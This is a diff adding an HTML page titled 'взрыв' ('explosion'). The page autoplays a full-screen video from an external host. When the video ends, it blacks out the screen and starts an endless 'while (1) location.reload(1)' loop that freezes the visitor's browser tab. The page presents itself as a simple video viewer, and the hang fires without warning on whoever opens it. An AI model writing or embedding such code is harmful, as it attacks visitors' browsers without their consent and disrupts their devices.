@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>взрыв</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body {
+      width: 100%;
+      height: 100%;
+      background: #000;
+      overflow: hidden;
+    }
+    #video {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      z-index: 10;
+    }
+    #black {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: #000;
+      z-index: 20;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <video id="video" src="https://files.catbox.moe/30xwjp.mp4" muted playsinline autoplay></video>
+  <div id="black"></div>
+
+  <script>
+    const video = document.getElementById('video');
+    const black = document.getElementById('black');
+
+    video.addEventListener('ended', () => {
+      // Hide the video
+      video.style.display = 'none';
+
+      // Show full black screen
+      black.style.display = 'block';
+
+      // After 1 second → infinite reload
+      setTimeout(() => {
+        while (1) location.reload(1);
+      }, 1000);
+    });
+  </script>
+</body>
+</html>
